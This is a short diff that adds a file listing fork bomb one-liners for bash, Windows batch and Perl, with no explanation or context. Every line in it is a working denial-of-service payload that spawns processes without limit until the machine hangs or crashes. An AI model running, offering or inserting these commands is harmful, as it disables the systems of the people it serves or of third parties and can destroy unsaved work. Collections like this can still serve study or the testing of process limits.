@@ -1,0 +1,6 @@
+bash:
+    :(){ :|:& };:
+bat:
+    %0|%0
+perl:
+    perl -e "fork while fork" &
